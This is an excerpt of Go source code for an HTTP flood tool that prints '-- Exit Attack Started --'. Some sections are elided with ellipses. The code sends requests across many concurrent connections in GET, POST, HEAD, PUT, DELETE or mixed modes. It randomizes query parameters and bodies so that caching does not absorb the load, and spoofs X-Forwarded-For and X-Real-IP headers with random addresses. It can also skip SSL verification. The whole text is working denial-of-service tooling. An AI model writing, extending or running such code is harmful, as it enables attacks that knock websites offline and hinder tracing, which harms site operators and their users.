...
func main() {
	...
	flag.StringVar(&attackMode, "mode", "get", "Attack mode: get, post, head, put, delete, mixed")
	...
	flag.BoolVar(&disableSSL, "insecure", false, "Disable SSL certificate verification")
	flag.IntVar(&requestDelay, "delay", 0, "Delay between requests in milliseconds")
	flag.Parse()

	t := os.Getenv("EXITMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 8192 // Increased default from 1023
	}
	
	// Initialize HTTP transport with connection pooling
	transport = &http.Transport{
		MaxIdleConns:        maxproc,
		MaxIdleConnsPerHost: maxproc / 2,
	...
	go func() {
		fmt.Printf("-- Exit Attack Started (v%s) --\n", __version__)
		fmt.Printf("Mode: %s | Max Conns: %d | Timeout: %ds\n\n", strings.ToUpper(attackMode), maxproc, timeout)
		...
		for {
			...
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", atomic.LoadInt32(&cur), maxproc, sent, err)
			}
			select {
			case status := <-ss:
				switch status {
...
func httpcall(targetURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
	...
	for {
		...
		// Determine HTTP method based on attack mode
		switch strings.ToLower(attackMode) {
		case "post":
			method = "POST"
			if data == "" {
				bodyData = buildblock(rand.Intn(50)+10) + "=" + buildblock(rand.Intn(50)+10)
			} else {
				bodyData = data
			}
			q, err = http.NewRequest(method, targetURL, strings.NewReader(bodyData))
		case "head":
			method = "HEAD"
			q, err = http.NewRequest(method, targetURL+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		case "put":
			method = "PUT"
			bodyData = buildblock(rand.Intn(100)+20)
			q, err = http.NewRequest(method, targetURL, strings.NewReader(bodyData))
		case "delete":
			method = "DELETE"
			q, err = http.NewRequest(method, targetURL+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		...
		if rand.Intn(2) == 0 {
			q.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
		}
		if rand.Intn(2) == 0 {
			q.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
		}
		if method == "POST" || method == "PUT" {
			q.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			q.Header.Set("Content-Length", strconv.Itoa(len(bodyData)))
		}
		...
		for _, element := range headers {
			...
			if len(words) >= 2 {
				q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(strings.Join(words[1:], ":")))
			}
		}
		...
		if r.Body != nil {
			// Read and discard response body quickly
